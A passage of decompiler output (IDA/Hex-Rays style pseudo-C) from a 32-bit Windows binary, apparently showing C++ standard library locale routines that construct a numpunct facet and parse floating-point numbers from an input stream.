  _Cvtvec v17; // [esp+3Ch] [ebp-80h] BYREF
  char v18[52]; // [esp+68h] [ebp-54h] BYREF
  _DWORD *v19; // [esp+9Ch] [ebp-20h]
  _DWORD *v20; // [esp+A0h] [ebp-1Ch]
  _DWORD *v21; // [esp+A4h] [ebp-18h]
  int v22; // [esp+A8h] [ebp-14h]
  int v23; // [esp+ACh] [ebp-10h]
  int v24; // [esp+B8h] [ebp-4h]

  v2 = 0;
  v21 = a1;
  v23 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(0x18u);
    v20 = v3;
    v24 = 0;
    if ( v3 )
    {
      v4 = *(_DWORD *)(a2 + 4);
      if ( v4 )
      {
        v5 = *(const char **)(v4 + 24);
        if ( !v5 )
          v5 = (const char *)(v4 + 28);
      }
      else
      {
        v5 = byte_4CCC25;
      }
      sub_401AF0((int)v18, v5);
      v3[1] = 0;
      v22 = 1;
      v23 = 1;
      v24 = 2;
      *v3 = &std::numpunct<char>::`vftable';
      localeconv();
      _Getcvt(&v17);
      v3[2] = 0;
      v3[4] = 0;
      v3[5] = 0;
      v19 = v3;
      LOBYTE(v24) = 3;
      _Getcvt(&v16);
      v6 = calloc(1u, 1u);
      if ( !v6 )
        goto LABEL_18;
      v7 = 6;
      *v6 = 0;
      v3[2] = v6;
      v8 = "false";
      v9 = calloc(6u, 1u);
      if ( !v9 )
        goto LABEL_18;
      do
      {
        v10 = *v8++;
        v8[v9 - "false" - 1] = v10;
        --v7;
      }
      while ( v7 );
      v11 = 5;
      v3[4] = v9;
      v12 = "true";
      v13 = calloc(5u, 1u);
      if ( !v13 )
LABEL_18:
        sub_46A166();
      do
      {
        v14 = *v12++;
        v12[v13 - "true" - 1] = v14;
        --v11;
      }
      while ( v11 );
      v2 = v22;
      v3[5] = v13;
      *((_WORD *)v3 + 6) = 11310;
    }
    else
    {
      v3 = 0;
    }
    *v21 = v3;
    if ( (v2 & 1) != 0 )
      sub_401BC0((int)v18);
  }
  return 4;
}
// 46A166: using guessed type void __noreturn sub_46A166(void);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B8780: using guessed type void *std::numpunct<char>::`vftable';

//----- (0042B950) --------------------------------------------------------
int __cdecl sub_42B950(int a1, char *a2, _BYTE *a3, int a4, int a5, int *a6)
{
  int v6; // eax
  struct std::_Facet_base *v8; // eax
  struct std::_Facet_base *v9; // ebx
  void (__thiscall ***v10)(_DWORD, int); // eax
  int v11; // eax
  char *v12; // ebx
  int v13; // edi
  char *v14; // eax
  int v15; // ecx
  void (__thiscall ***v16)(_DWORD, int); // eax
  char v17; // al
  _BYTE *v18; // ecx
  char *v19; // eax
  char v20; // al
  int v21; // edi
  int v22; // ecx
  char *v23; // ebx
  bool v24; // zf
  char *v25; // eax
  char v26; // al
  unsigned int v27; // ebx
  int v28; // edi
  _DWORD **v29; // ecx
  unsigned __int8 *v30; // edx
  int v31; // eax
  unsigned __int8 v32; // bl
  char *v33; // eax
  char *v34; // ecx
  unsigned int v35; // ecx
  int v36; // edx
  char v37; // al
  char *v38; // ecx
  void **v39; // eax
  void **v40; // eax
  void **v41; // eax
  _DWORD **v42; // ecx
  int *v43; // edx
  unsigned __int8 **v44; // ecx
  unsigned __int8 *v45; // edx
  int v46; // eax
  char v47; // al
  void **v48; // edx
  void **v49; // eax
  char *v50; // eax
  char v51; // cl
  void **v52; // eax
  void **v53; // eax
  void **v54; // eax
  _DWORD **v55; // ecx
  unsigned __int8 *v56; // edx
  int v57; // eax
  _DWORD **v58; // ecx
  unsigned __int8 *v59; // edx
  int v60; // eax
  char *v61; // eax
  char *v62; // ecx
  unsigned int v63; // ecx
  _DWORD **v64; // ecx
  int *v65; // edx
  unsigned __int8 **v66; // ecx
  unsigned __int8 *v67; // edx
  int v68; // eax
  char v69; // al
  char v70; // bl
  struct lconv *v71; // eax
  char *v72; // ebx
  char *v73; // ebx
  _DWORD **v74; // ecx
  int *v75; // edx
  unsigned __int8 **v76; // ecx
  unsigned __int8 *v77; // edx
  int v78; // eax
  int v79; // ebx
  int v80; // edi
  _DWORD **v81; // ecx
  unsigned __int8 *v82; // edx
  int v83; // eax
  _DWORD **v84; // ecx
  int *v85; // edx
  unsigned __int8 **v86; // ecx
  unsigned __int8 *v87; // edx
  int v88; // eax
  char v89; // al
  int v90; // eax
  _DWORD **v91; // ecx
  unsigned __int8 *v92; // edx
  int v93; // eax
  char *v94; // eax
  char *v95; // ecx
  unsigned int v96; // ecx
  int v97; // eax
  _DWORD **v98; // ecx
  int *v99; // edx
  unsigned __int8 **v100; // ecx
  unsigned __int8 *v101; // edx
  int v102; // eax
  char v103; // al
  char *v104; // edi
  struct lconv *v105; // eax
  char v106; // cl
  char v107; // al
  _DWORD **v108; // ecx
  unsigned __int8 *v109; // edx
  int v110; // eax
  char v111; // cl
  _DWORD **v112; // ecx
  int *v113; // edx
  unsigned __int8 **v114; // ecx
  unsigned __int8 *v115; // edx
  int v116; // eax
  char v117; // al
  int v118; // edi
  _DWORD **v119; // ecx
  unsigned __int8 *v120; // edx
  int v121; // eax
  char v122; // cl
  _DWORD **v123; // ecx
  int *v124; // edx
  unsigned __int8 **v125; // ecx
  unsigned __int8 *v126; // edx
  int v127; // eax
  _DWORD **v128; // ecx
  int *v129; // edx
  unsigned __int8 **v130; // ecx
  unsigned __int8 *v131; // edx
  int v132; // eax
  _DWORD **v133; // ecx
  unsigned __int8 *v134; // edx
  int v135; // eax
  _DWORD **v136; // ecx
  int *v137; // edx
  unsigned __int8 **v138; // ecx
  unsigned __int8 *v139; // edx
  int v140; // eax
  char v141; // al
  _DWORD **v142; // ecx
  unsigned __int8 *v143; // edx
  int v144; // eax
  char *v145; // eax
  char *v146; // ecx
  unsigned int v147; // ecx
  _DWORD **v148; // ecx
  int *v149; // edx
  unsigned __int8 **v150; // ecx
  unsigned __int8 *v151; // edx
  int v152; // eax
  char v153; // al
  unsigned int v154; // edx
  void *v155; // ecx
  int v156; // [esp-4h] [ebp-A4h]
  int v157; // [esp-4h] [ebp-A4h]
  int v158; // [esp-4h] [ebp-A4h]
  int v159; // [esp-4h] [ebp-A4h]
  int v160; // [esp-4h] [ebp-A4h]
  int v161; // [esp-4h] [ebp-A4h]
  struct std::_Facet_base *v162; // [esp+14h] [ebp-8Ch]
  int v163; // [esp+18h] [ebp-88h]
  char *v164; // [esp+20h] [ebp-80h]
  char v165[4]; // [esp+24h] [ebp-7Ch] BYREF
  char *v166; // [esp+28h] [ebp-78h]
  int v167; // [esp+2Ch] [ebp-74h]
  int v168; // [esp+30h] [ebp-70h]
  unsigned int v169; // [esp+34h] [ebp-6Ch]
  void **v170; // [esp+38h] [ebp-68h]
  char *v171; // [esp+3Ch] [ebp-64h]
  int v172; // [esp+40h] [ebp-60h]
  char v173; // [esp+46h] [ebp-5Ah]
  char v174; // [esp+47h] [ebp-59h]
  int v175; // [esp+48h] [ebp-58h]
  char v176; // [esp+4Fh] [ebp-51h]
  int v177[5]; // [esp+50h] [ebp-50h] BYREF
  unsigned int v178; // [esp+64h] [ebp-3Ch]
  void *v179[5]; // [esp+68h] [ebp-38h] BYREF
  unsigned int v180; // [esp+7Ch] [ebp-24h]
  char Buf[10]; // [esp+80h] [ebp-20h] BYREF
  char v182; // [esp+8Ah] [ebp-16h]
  char v183; // [esp+8Bh] [ebp-15h]
  char v184; // [esp+8Ch] [ebp-14h]
  char v185; // [esp+8Dh] [ebp-13h]
  char v186[2]; // [esp+8Eh] [ebp-12h] BYREF
  int v187; // [esp+9Ch] [ebp-4h]
  int savedregs; // [esp+A0h] [ebp+0h] BYREF

  v6 = *(_DWORD *)(a5 + 20) & 0x3000;
  v175 = a4;
  if ( v6 == 12288 )
    return sub_42C5F0(a1, a2, a3, a4, a5, a6);
  v166 = *(char **)(*(_DWORD *)(a5 + 48) + 4);
  (*(void (**)(void))(*(_DWORD *)v166 + 4))();
  v187 = 0;
  v8 = sub_42A3A0((int)v165);
  v187 = -1;
  v9 = v8;
  v162 = v8;
  if ( v166 )
  {
    v10 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(char *))(*(_DWORD *)v166 + 8))(v166);
    if ( v10 )
      (**v10)(v10, 1);
  }
  (*(void (__thiscall **)(struct std::_Facet_base *, int *))(*(_DWORD *)v9 + 20))(v9, v177);
  v11 = *(_DWORD *)(a5 + 48);
  v12 = a2;
  v187 = 1;
  v173 = 0;
  v13 = *(_DWORD *)(v11 + 4);
  LOBYTE(v167) = 0;
  v166 = (char *)v13;
  (*(void (__thiscall **)(int))(*(_DWORD *)v13 + 4))(v13);
  LOBYTE(v187) = 2;
  v14 = sub_421800((int)&savedregs, (int)v165);
  LOBYTE(v187) = 1;
  v15 = (int)v14;
  v166 = v14;
  if ( v13 )
  {
    v16 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v13 + 8))(v13);
    if ( v16 )
      (**v16)(v16, 1);
    v15 = (int)v166;
  }
  (*(void (__thiscall **)(int, const char *, void *, char *))(*(_DWORD *)v15 + 28))(
    v15,
    "0123456789-+Ee",
    &unk_4B87EB,
    Buf);
  if ( sub_429020((int)a3, v175) )
    goto LABEL_16;
  v17 = sub_42ADB0(a3);
  v18 = a3;
  if ( v17 == v183 )
  {
    v19 = a2;
    *a2 = 43;
LABEL_15:
    v12 = v19 + 1;
    sub_42AE00(v18);
    goto LABEL_16;
  }
  v20 = sub_42ADB0(a3);
  if ( v20 == v182 )
  {
    v19 = a2;
    v18 = a3;
    *a2 = 45;
    goto LABEL_15;
  }
LABEL_16:
  *v12 = 48;
  v176 = 0;
  v21 = 0;
  v22 = 36;
  v166 = v12;
  v23 = v12 + 1;
  v168 = 0;
  v171 = v23;
  v24 = *a6 == 1000000000;
  v25 = (char *)v177;
  v172 = 0;
  if ( v24 )
    v22 = 768;
  v163 = v22;
  if ( v178 >= 0x10 )
    v25 = (char *)v177[0];
  v164 = v25;
  v26 = *v25;
  if ( v26 == 127 || v26 <= 0 )
  {
    if ( !sub_429020((int)a3, v175) )
    {
      do
      {
        if ( !a3[4] )
        {
          v58 = *(_DWORD ***)a3;
          if ( !*(_DWORD *)a3
            || ((v59 = (unsigned __int8 *)*v58[7]) == 0 || (int)*v58[11] <= 0
              ? (v60 = ((int (__thiscall *)(_DWORD **))(*v58)[6])(v58))
              : (v60 = *v59),
                v60 == -1) )
          {
            *(_DWORD *)a3 = 0;
          }
          else
          {
            a3[5] = v60;
          }
          a3[4] = 1;
        }
        v61 = (char *)memchr(Buf, (unsigned __int8)a3[5], 0xEu);
        v62 = v186;
        if ( v61 )
          v62 = v61;
        v63 = v62 - Buf;
        if ( v63 >= 0xA )
          break;
        if ( v163 > v21 )
        {
          if ( v63 || v21 )
          {
            *v23++ = a0123456789Ee[v63];
            ++v21;
          }
        }
        else
        {
          ++v172;
          if ( v63 )
            LOBYTE(v167) = 1;
        }
        v64 = *(_DWORD ***)a3;
        v176 = 1;
        if ( !v64
          || (!*v64[7] || (v65 = v64[11], *v65 <= 0)
            ? (v68 = ((int (__thiscall *)(_DWORD **))(*v64)[7])(v64))
            : (--*v65, v66 = (unsigned __int8 **)v64[7], v67 = *v66, ++*v66, v68 = *v67),
              v68 == -1) )
        {
          *(_DWORD *)a3 = 0;
          v69 = 1;
        }
        else
        {
          v69 = 0;
        }
        v157 = v175;
        a3[4] = v69;
      }
      while ( !sub_429020((int)a3, v157) );
      v168 = v21;
      v171 = v23;
    }
    goto LABEL_93;
  }
  if ( v177[4] )
    v174 = (*(int (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v162 + 16))(v162);
  else
    v174 = 0;
  v27 = 15;
  v169 = 15;
  v180 = 15;
  v179[4] = (void *)1;
  LOWORD(v179[0]) = 0;
  LOBYTE(v187) = 3;
  v28 = 0;
  if ( sub_429020((int)a3, v175) )
  {
    v48 = (void **)v179[0];
    goto LABEL_74;
  }
  v170 = (void **)v179[0];
  while ( 1 )
  {
    if ( !a3[4] )
    {
      v29 = *(_DWORD ***)a3;
      if ( !*(_DWORD *)a3
        || ((v30 = (unsigned __int8 *)*v29[7]) == 0 || (int)*v29[11] <= 0
          ? (v31 = ((int (__thiscall *)(_DWORD **))(*v29)[6])(v29))
          : (v31 = *v30),
            v31 == -1) )
      {
        *(_DWORD *)a3 = 0;
      }
      else
      {
        a3[5] = v31;
      }
      a3[4] = 1;
    }
    v32 = a3[5];
    v33 = (char *)memchr(Buf, v32, 0xEu);
    v34 = v186;
    if ( v33 )
      v34 = v33;
    v35 = v34 - Buf;
    if ( v35 >= 0xA )
      break;
    v36 = v168;
    v176 = 1;
    if ( v163 > v168 )
    {
      if ( v35 || v168 )
      {
        v37 = a0123456789Ee[v35];
        v38 = v171;
        *v171 = v37;
        v171 = v38 + 1;
        v168 = v36 + 1;
      }
    }
    else
    {
      ++v172;
      if ( v35 )
        LOBYTE(v167) = 1;
    }
    v39 = v179;
    if ( v169 >= 0x10 )
      v39 = v170;
    if ( *((_BYTE *)v39 + v28) == 127 )
      goto LABEL_59;
    v40 = v179;
    if ( v169 >= 0x10 )
      v40 = v170;
    ++*((_BYTE *)v40 + v28);
    v169 = v180;
LABEL_58:
    v170 = (void **)v179[0];
LABEL_59:
    v42 = *(_DWORD ***)a3;
    if ( !*(_DWORD *)a3
      || (!*v42[7] || (v43 = v42[11], *v43 <= 0)
        ? (v46 = ((int (__thiscall *)(_DWORD **))(*v42)[7])(v42))
        : (--*v43, v44 = (unsigned __int8 **)v42[7], v45 = *v44, ++*v44, v46 = *v45),
          v46 == -1) )
    {
      *(_DWORD *)a3 = 0;
      v47 = 1;
    }
    else
    {
      v47 = 0;
    }
    v156 = v175;
    a3[4] = v47;
    if ( sub_429020((int)a3, v156) )
      goto LABEL_68;
  }
  v41 = v179;
  if ( v169 >= 0x10 )
    v41 = v170;
  if ( *((_BYTE *)v41 + v28) && v174 && v32 == v174 )
  {
    sub_41ED20(v179, 0);
    ++v28;
    v169 = v180;
    goto LABEL_58;
  }
LABEL_68:
  v27 = v169;
  v48 = v170;
  if ( v28 )
  {
    v49 = v179;
    if ( v169 >= 0x10 )
      v49 = v170;
    if ( *((char *)v49 + v28) > 0 )
    {
      ++v28;
      goto LABEL_74;
    }
LABEL_87:
    v173 = 1;
  }
  else
  {
LABEL_74:
    v50 = v164;
    while ( v28 )
    {
      v51 = *v50;
      if ( *v50 == 127 )
        break;
      if ( --v28 )
      {
        v52 = v179;
        if ( v27 >= 0x10 )
          v52 = v48;
        if ( v51 != *((_BYTE *)v52 + v28) )
          goto LABEL_87;
      }
      if ( !v28 )
      {
        v53 = v179;
        if ( v27 >= 0x10 )
          v53 = v48;
        if ( v51 < *(char *)v53 )
          goto LABEL_87;
      }
      v50 = v164 + 1;
      if ( v164[1] <= 0 )
        goto LABEL_74;
      ++v164;
    }
  }
  LOBYTE(v187) = 1;
  if ( v27 >= 0x10 )
  {
    v54 = v48;
    if ( v27 + 1 >= 0x1000 )
    {
      v48 = (void **)*(v48 - 1);
      if ( (unsigned int)((char *)v54 - (char *)v48 - 4) > 0x1F )
        goto LABEL_317;
    }
    sub_46C87D(v48);
  }
  v21 = v168;
LABEL_93:
  if ( sub_429020((int)a3, v175) )
    goto LABEL_143;
  if ( !a3[4] )
  {
    v55 = *(_DWORD ***)a3;
    if ( !*(_DWORD *)a3
      || ((v56 = (unsigned __int8 *)*v55[7]) == 0 || (int)*v55[11] <= 0
        ? (v57 = ((int (__thiscall *)(_DWORD **))(*v55)[6])(v55))
        : (v57 = *v56),
          v57 == -1) )
    {
      *(_DWORD *)a3 = 0;
    }
    else
    {
      a3[5] = v57;
    }
    a3[4] = 1;
  }
  v70 = a3[5];
  if ( v70 != (*(unsigned __int8 (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v162 + 12))(v162) )
  {
LABEL_143:
    v73 = v171;
  }
  else
  {
    v71 = localeconv();
    v72 = v171;
    *v171 = *v71->decimal_point;
    v73 = v72 + 1;
    v74 = *(_DWORD ***)a3;
    v171 = v73;
    if ( !v74
      || (!*v74[7] || (v75 = v74[11], *v75 <= 0)
        ? (v78 = ((int (__thiscall *)(_DWORD **))(*v74)[7])(v74))
        : (--*v75, v76 = (unsigned __int8 **)v74[7], v77 = *v76, ++*v76, v78 = *v77),
          v78 == -1) )
    {
      *(_DWORD *)a3 = 0;
      a3[4] = 1;
    }
    else
    {
      a3[4] = 0;
    }
  }
  if ( *a6 != 1000000000 && !v21 )
  {
    if ( !sub_429020((int)a3, v175) )
    {
      v79 = v175;
      v80 = v172;
      do
      {
        if ( !a3[4] )
        {
          v81 = *(_DWORD ***)a3;
          if ( !*(_DWORD *)a3
            || ((v82 = (unsigned __int8 *)*v81[7]) == 0 || (int)*v81[11] <= 0
              ? (v83 = ((int (__thiscall *)(_DWORD **))(*v81)[6])(v81))
              : (v83 = *v82),
                v83 == -1) )
          {
            *(_DWORD *)a3 = 0;
          }
          else
          {
            a3[5] = v83;
          }
          a3[4] = 1;
        }
        if ( a3[5] != Buf[0] )
          break;
        v84 = *(_DWORD ***)a3;
        --v80;
        v176 = 1;
        if ( !v84
          || (!*v84[7] || (v85 = v84[11], *v85 <= 0)
            ? (v88 = ((int (__thiscall *)(_DWORD **))(*v84)[7])(v84))
            : (--*v85, v86 = (unsigned __int8 **)v84[7], v87 = *v86, ++*v86, v88 = *v87),
              v88 == -1) )
        {
          *(_DWORD *)a3 = 0;
          v89 = 1;
        }
        else
        {
          v89 = 0;
        }
        a3[4] = v89;
      }
      while ( !sub_429020((int)a3, v79) );
      v73 = v171;
      v172 = v80;
      v21 = v168;
    }
    v90 = v172;
    if ( v172 < 0 )
    {
      *v73++ = 48;
      v172 = v90 + 1;
    }
  }
  if ( !sub_429020((int)a3, v175) )
  {
    do
    {
      if ( !a3[4] )
      {
        v91 = *(_DWORD ***)a3;
        if ( !*(_DWORD *)a3
          || ((v92 = (unsigned __int8 *)*v91[7]) == 0 || (int)*v91[11] <= 0
            ? (v93 = ((int (__thiscall *)(_DWORD **))(*v91)[6])(v91))
            : (v93 = *v92),
              v93 == -1) )
        {
          *(_DWORD *)a3 = 0;
        }
        else
        {
          a3[5] = v93;
        }
        a3[4] = 1;
      }
      v94 = (char *)memchr(Buf, (unsigned __int8)a3[5], 0xEu);
      v95 = v186;
      if ( v94 )
        v95 = v94;
      v96 = v95 - Buf;
      if ( v96 >= 0xA )
        break;
      if ( v21 >= v163 )
      {
        v97 = (unsigned __int8)v167;
        if ( v96 )
          v97 = 1;
        v167 = v97;
      }
      else
      {
        *v73++ = a0123456789Ee[v96];
        ++v21;
      }
      v98 = *(_DWORD ***)a3;
      v176 = 1;
      if ( !v98
        || (!*v98[7] || (v99 = v98[11], *v99 <= 0)
          ? (v102 = ((int (__thiscall *)(_DWORD **))(*v98)[7])(v98))
          : (--*v99, v100 = (unsigned __int8 **)v98[7], v101 = *v100, ++*v100, v102 = *v101),
            v102 == -1) )
      {
        *(_DWORD *)a3 = 0;
        v103 = 1;
      }
      else
      {
        v103 = 0;
      }
      v158 = v175;
      a3[4] = v103;
    }
    while ( !sub_429020((int)a3, v158) );
  }
  if ( !(_BYTE)v167 )
    goto LABEL_208;
  v104 = v73 - 1;
  if ( v73 - 1 == v166 )
    goto LABEL_207;
  while ( 2 )
  {
    v105 = localeconv();
    v106 = *v104;
    if ( *v104 == *v105->decimal_point )
    {
LABEL_204:
      if ( --v104 == v166 )
        goto LABEL_207;
      continue;
    }
    break;
  }
  if ( v106 == 57 )
  {
    *v104 = 48;
    goto LABEL_204;
  }
  *v104 = v106 + 1;
  if ( v104 == v166 )
  {
LABEL_207:
    ++v172;
    *v104 = 49;
  }
LABEL_208:
  v107 = v176;
  if ( v176 )
  {
    if ( !sub_429020((int)a3, v175) )
    {
      if ( !a3[4] )
      {
        v108 = *(_DWORD ***)a3;
        if ( !*(_DWORD *)a3
          || ((v109 = (unsigned __int8 *)*v108[7]) == 0 || (int)*v108[11] <= 0
            ? (v110 = ((int (__thiscall *)(_DWORD **))(*v108)[6])(v108))
            : (v110 = *v109),
              v110 == -1) )
        {
          *(_DWORD *)a3 = 0;
        }
        else
        {
          a3[5] = v110;
        }
        a3[4] = 1;
      }
      v111 = a3[5];
      if ( v111 == v185 || v111 == v184 )
      {
        *v73++ = 101;
        v112 = *(_DWORD ***)a3;
        if ( !*(_DWORD *)a3
          || (!*v112[7] || (v113 = v112[11], *v113 <= 0)
            ? (v116 = ((int (__thiscall *)(_DWORD **))(*v112)[7])(v112))
            : (--*v113, v114 = (unsigned __int8 **)v112[7], v115 = *v114, ++*v114, v116 = *v115),
              v116 == -1) )
        {
          *(_DWORD *)a3 = 0;
          v117 = 1;
        }
        else
        {
          v117 = 0;
        }
        v159 = v175;
        a3[4] = v117;
        v118 = 0;
        v176 = 0;
        if ( !sub_429020((int)a3, v159) )
        {
          if ( !a3[4] )
          {
            v119 = *(_DWORD ***)a3;
            if ( !*(_DWORD *)a3
              || ((v120 = (unsigned __int8 *)*v119[7]) == 0 || (int)*v119[11] <= 0
                ? (v121 = ((int (__thiscall *)(_DWORD **))(*v119)[6])(v119))
                : (v121 = *v120),
                  v121 == -1) )
            {
              *(_DWORD *)a3 = 0;
            }
            else
            {
              a3[5] = v121;
            }
            a3[4] = 1;
          }
          v122 = a3[5];
          if ( v122 == v183 )
          {
            *v73++ = 43;
            v123 = *(_DWORD ***)a3;
            if ( !*(_DWORD *)a3
              || (!*v123[7] || (v124 = v123[11], *v124 <= 0)
                ? (v127 = ((int (__thiscall *)(_DWORD **))(*v123)[7])(v123))
                : (--*v124, v125 = (unsigned __int8 **)v123[7], v126 = *v125, ++*v125, v127 = *v126),
                  v127 == -1) )
            {
              *(_DWORD *)a3 = 0;
              a3[4] = 1;
            }
            else
            {
              a3[4] = 0;
            }
          }
          else if ( v122 == v182 )
          {
            *v73++ = 45;
            v128 = *(_DWORD ***)a3;
            if ( !*(_DWORD *)a3
              || (!*v128[7] || (v129 = v128[11], *v129 <= 0)
                ? (v132 = ((int (__thiscall *)(_DWORD **))(*v128)[7])(v128))
                : (--*v129, v130 = (unsigned __int8 **)v128[7], v131 = *v130, ++*v130, v132 = *v131),
                  v132 == -1) )
            {
              *(_DWORD *)a3 = 0;
              a3[4] = 1;
            }
            else
            {
              a3[4] = 0;
            }
          }
        }
        if ( !sub_429020((int)a3, v175) )
        {
          while ( 1 )
          {
            if ( !a3[4] )
            {
              v133 = *(_DWORD ***)a3;
              if ( !*(_DWORD *)a3
                || ((v134 = (unsigned __int8 *)*v133[7]) == 0 || (int)*v133[11] <= 0
                  ? (v135 = ((int (__thiscall *)(_DWORD **))(*v133)[6])(v133))
                  : (v135 = *v134),
                    v135 == -1) )
              {
                *(_DWORD *)a3 = 0;
              }
              else
              {
                a3[5] = v135;
              }
              a3[4] = 1;
            }
            if ( a3[5] != Buf[0] )
              break;
            v136 = *(_DWORD ***)a3;
            v176 = 1;
            if ( !v136
              || (!*v136[7] || (v137 = v136[11], *v137 <= 0)
                ? (v140 = ((int (__thiscall *)(_DWORD **))(*v136)[7])(v136))
                : (--*v137, v138 = (unsigned __int8 **)v136[7], v139 = *v138, ++*v138, v140 = *v139),
                  v140 == -1) )
            {
              *(_DWORD *)a3 = 0;
              v141 = 1;
            }
            else
            {
              v141 = 0;
            }
            v160 = v175;
            a3[4] = v141;
            if ( sub_429020((int)a3, v160) )
              goto LABEL_282;
          }
          if ( !v176 )
            goto LABEL_283;
LABEL_282:
          *v73++ = 48;
        }
LABEL_283:
        if ( !sub_429020((int)a3, v175) )
        {
          do
          {
            if ( !a3[4] )
            {
              v142 = *(_DWORD ***)a3;
              if ( !*(_DWORD *)a3
                || ((v143 = (unsigned __int8 *)*v142[7]) == 0 || (int)*v142[11] <= 0
                  ? (v144 = ((int (__thiscall *)(_DWORD **))(*v142)[6])(v142))
                  : (v144 = *v143),
                    v144 == -1) )
              {
                *(_DWORD *)a3 = 0;
              }
              else
              {
                a3[5] = v144;
              }
              a3[4] = 1;
            }
            v145 = (char *)memchr(Buf, (unsigned __int8)a3[5], 0xEu);
            v146 = v186;
            if ( v145 )
              v146 = v145;
            v147 = v146 - Buf;
            if ( v147 >= 0xA )
              break;
            if ( v118 < 8 )
            {
              *v73++ = a0123456789Ee[v147];
              ++v118;
            }
            v148 = *(_DWORD ***)a3;
            v176 = 1;
            if ( !v148
              || (!*v148[7] || (v149 = v148[11], *v149 <= 0)
                ? (v152 = ((int (__thiscall *)(_DWORD **))(*v148)[7])(v148))
                : (--*v149, v150 = (unsigned __int8 **)v148[7], v151 = *v150, ++*v150, v152 = *v151),
                  v152 == -1) )
            {
              *(_DWORD *)a3 = 0;
              v153 = 1;
            }
            else
            {
              v153 = 0;
            }
            v161 = v175;
            a3[4] = v153;
          }
          while ( !sub_429020((int)a3, v161) );
        }
      }
    }
    v107 = v176;
  }
  if ( v173 || !v107 )
    v73 = a2;
  v154 = v178;
  *v73 = 0;
  if ( v154 >= 0x10 )
  {
    v155 = (void *)v177[0];
    if ( v154 + 1 < 0x1000 || (v155 = *(void **)(v177[0] - 4), (unsigned int)(v177[0] - (_DWORD)v155 - 4) <= 0x1F) )
    {
      sub_46C87D(v155);
      return v172;
    }
LABEL_317:
    _invalid_parameter_noinfo_noreturn();
  }
  return v172;
}
// 42BC5B: conditional instruction was optimized away because bh.1!=0
// 42C203: conditional instruction was optimized away because al.1!=0
// 42C341: conditional instruction was optimized away because al.1!=0
// 42B950: using guessed type char var_7C[4];

//----- (0042C5F0) --------------------------------------------------------
int __cdecl sub_42C5F0(int a1, _BYTE *a2, _BYTE *a3, int a4, int a5, int *a6)
{
  struct std::_Facet_base *v6; // eax
  struct std::_Facet_base *v7; // ebx
  void (__thiscall ***v8)(_DWORD, int); // eax
  int v9; // eax
  int v10; // edi
  char *v11; // eax
  char *v12; // ebx
  void (__thiscall ***v13)(_DWORD, int); // eax
  _WORD *v14; // edi
  _DWORD **v15; // ecx
  unsigned __int8 *v16; // edx
  int v17; // eax
  _BYTE *v18; // ecx
  char v19; // al
  int v20; // ebx
  char *v21; // edi
  _DWORD **v22; // ecx
  unsigned __int8 *v23; // edx
  int v24; // eax
  _BYTE *v25; // eax
  char v26; // al
  char v27; // al
  int v28; // eax
  char *v29; // eax
  char v30; // al
  unsigned int v31; // ebx
  int v32; // edi
  _DWORD **v33; // ecx
  unsigned __int8 *v34; // edx
  int v35; // eax
  unsigned __int8 v36; // bl
  char *v37; // eax
  char *v38; // ecx
  unsigned int v39; // ecx
  int v40; // edx
  char v41; // al
  char *v42; // ecx
  void **v43; // eax
  void **v44; // eax
  void **v45; // eax
  _DWORD **v46; // ecx
  int *v47; // edx
  unsigned __int8 **v48; // ecx
  unsigned __int8 *v49; // edx
  int v50; // eax
  char v51; // al
  void **v52; // edx
  void **v53; // eax
  char *v54; // eax
  char v55; // cl
  void **v56; // eax
  void **v57; // eax
  void **v58; // eax
  _DWORD **v59; // ecx
  unsigned __int8 *v60; // edx
  int v61; // eax
  _DWORD **v62; // ecx
  unsigned __int8 *v63; // edx
  int v64; // eax
  char *v65; // eax
  char *v66; // ecx
  unsigned int v67; // ecx
  _DWORD **v68; // ecx
  int *v69; // edx
  unsigned __int8 **v70; // ecx
  unsigned __int8 *v71; // edx
  int v72; // eax
  char v73; // al
  char v74; // bl
  _DWORD **v75; // ecx
  int *v76; // edx
  unsigned __int8 **v77; // ecx
  unsigned __int8 *v78; // edx
  int v79; // eax
  int v80; // ebx
  int v81; // ebx
  int v82; // edi
  _DWORD **v83; // ecx
  unsigned __int8 *v84; // edx
  int v85; // eax
  _DWORD **v86; // ecx
  int *v87; // edx
  unsigned __int8 **v88; // ecx
  unsigned __int8 *v89; // edx
  int v90; // eax
  char v91; // al
  int v92; // eax
  _DWORD **v93; // ecx
  unsigned __int8 *v94; // edx
  int v95; // eax
  char *v96; // eax
  char *v97; // ecx
  unsigned int v98; // ecx
  _DWORD **v99; // ecx
  int *v100; // edx
  unsigned __int8 **v101; // ecx
  unsigned __int8 *v102; // edx
  int v103; // eax
  char v104; // al
  char v105; // al
  _DWORD **v106; // ecx
  unsigned __int8 *v107; // edx
  int v108; // eax
  char v109; // cl
  _DWORD **v110; // ecx
  int *v111; // edx
  unsigned __int8 **v112; // ecx
  unsigned __int8 *v113; // edx
  int v114; // eax
  char v115; // al
  int v116; // ebx
  _DWORD **v117; // ecx
  unsigned __int8 *v118; // edx
  int v119; // eax
  char v120; // cl
  _DWORD **v121; // ecx
  int *v122; // edx
  unsigned __int8 **v123; // ecx
  unsigned __int8 *v124; // edx
  int v125; // eax
  _DWORD **v126; // ecx
  int *v127; // edx
  unsigned __int8 **v128; // ecx
  unsigned __int8 *v129; // edx
  int v130; // eax
  _DWORD **v131; // ecx
  unsigned __int8 *v132; // edx
  int v133; // eax
  _DWORD **v134; // ecx
  int *v135; // edx
  unsigned __int8 **v136; // ecx
  unsigned __int8 *v137; // edx
  int v138; // eax
  char v139; // al
  _DWORD **v140; // ecx
  unsigned __int8 *v141; // edx
  int v142; // eax
  char *v143; // eax
  char *v144; // ecx
  unsigned int v145; // ecx
  _DWORD **v146; // ecx
  int *v147; // edx
  unsigned __int8 **v148; // ecx
  unsigned __int8 *v149; // edx
  int v150; // eax
  char v151; // al
  unsigned int v152; // edx
  int v153; // eax
  void *v154; // ecx
  int v156; // [esp-4h] [ebp-ACh]
  int v157; // [esp-4h] [ebp-ACh]
  int v158; // [esp-4h] [ebp-ACh]
  int v159; // [esp-4h] [ebp-ACh]
  int v160; // [esp-4h] [ebp-ACh]
  int v161; // [esp-4h] [ebp-ACh]
  int v162; // [esp-4h] [ebp-ACh]
  struct std::_Facet_base *v163; // [esp+18h] [ebp-90h]
